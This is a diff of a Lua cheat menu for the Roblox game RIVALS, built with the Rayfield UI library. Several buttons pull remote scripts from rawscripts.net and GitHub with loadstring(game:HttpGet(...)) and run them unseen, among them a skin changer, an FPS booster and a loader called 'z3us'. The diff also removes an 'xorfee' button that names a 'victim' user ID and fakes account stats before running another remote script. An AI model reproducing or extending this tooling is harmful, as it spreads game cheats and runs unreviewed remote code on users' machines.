@@ -78,6 +78,27 @@ MainTab:CreateSlider({
 MainTab:CreateSection("Utilities")
 
 MainTab:CreateButton({
+   Name = "Stretched Res",
+   Callback = function()
+       loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Stretched-Resolution-Higher-FOV-48170"))()
+   end,
+})
+
+MainTab:CreateButton({
+   Name = "Skin Changer",
+   Callback = function()
+       loadstring(game:HttpGet("https://rawscripts.net/raw/RIVALS-Skin-Changer-74896"))()
+   end,
+})
+
+MainTab:CreateButton({
+   Name = "fps booster",
+   Callback = function()
+       loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Optiz-FpsBooster-60070"))()
+   end,
+})
+
+MainTab:CreateButton({
    Name = "Take the L (Emote Swap)",
    Callback = function()
        local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -94,30 +115,7 @@ MainTab:CreateButton({
                return oldRequire(module)
            end)
            Rayfield:Notify({Title = "Emote Active", Content = "Shoulder Brush now plays Take The L!", Duration = 5})
-       else
-           Rayfield:Notify({Title = "Error", Content = "Emotes not found in game files.", Duration = 5})
        end
-   end,
-})
-
-MainTab:CreateButton({
-   Name = "Skin Changer",
-   Callback = function()
-       loadstring(game:HttpGet("https://rawscripts.net/raw/RIVALS-Skin-Changer-74896"))()
-   end,
-})
-
-MainTab:CreateButton({
-   Name = "MENU TOGGLE: [ K ]",
-   Callback = function()
-       Rayfield:Notify({Title = "Info", Content = "Press 'K' to hide or show this menu!", Duration = 3})
-   end,
-})
-
-MainTab:CreateButton({
-   Name = "fps booster",
-   Callback = function()
-       loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Optiz-FpsBooster-60070"))()
    end,
 })
 
@@ -167,26 +165,6 @@ MainTab:CreateButton({
    Name = "z3us",
    Callback = function()
        loadstring(game:HttpGet(('https://raw.githubusercontent.com/blackowl1231/ZYPHERION/refs/heads/main/main.lua')))()
-   end,
-})
-
-MainTab:CreateButton({
-   Name = "xorfee",
-   Callback = function()
-       getgenv().Config = {
-           victim = 716661842,
-           helper = "",
-           level = 979,
-           streak = 1927,
-           elo = 92802829228922892829272,
-           keys = 0,
-           premium = true,
-           verified = false,
-           unlockall = true,
-           platform = "DESKTOP",
-           join = "discord.gg/rivalscomp"
-       }
-       loadstring(game:HttpGet("https://raw.githubusercontent.com/WEFGQERQEGWGE/a/refs/heads/main/UDRCRFRAMESCRIPT.lua"))()
    end,
 })
 
